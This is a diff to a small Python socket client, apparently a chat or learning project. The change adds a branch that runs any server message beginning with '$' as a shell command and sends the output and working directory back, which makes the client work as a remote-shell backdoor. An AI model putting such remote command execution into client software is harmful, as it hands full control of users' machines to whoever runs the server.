@@ -7,7 +7,7 @@ from queue import Queue
 import time
 
 host = '127.0.0.1'
-port = 5563
+port = 5561
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
@@ -39,18 +39,32 @@ def receive_data(s):
     while True:
         #print('Inside the Thread - recieve data()')
         data = s.recv(1024)
+        data = data.decode('utf-8')
+        print('Received' + str(data))
         if not data:
             print('Server was reset or closed. \n Waiting to connect to the server')
             s = connect_to_server()
-        elif(data[:2].decode('utf-8') == 'cd'):
-            os.chdir(data[3:].decode('utf-8'))
+        elif(data[:2] == 'cd'):
+            os.chdir(data[3:])
+            print('directory changed')
         elif(len(data) > 0 and data[0] == '@'):
             l = len(data.split(' ')[0])
             print(str(data[0:l]) + '> ')
-            print(data[l + 1:].decode('utf-8'))
-        elif(len(data) > 0):
+            print(data[l + 1:])
+        elif(len(data) > 0 and data[0] == '$'):
+            data = data[1:]
+            print('Command Received')
+            cmd = subprocess.Popen(data[:],  shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
+            output = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output, 'utf-8')
+            currentWD = os.getcwd() + '>'
+            #print(output_str)
+            s.send(str.encode(output_str + currentWD))
+            print(output_str)
+        else:
             #print('root> ', end = "")
-            print(data.decode('utf-8'))
+            print(data)
+            
 
 def send_data(s):
     while True:
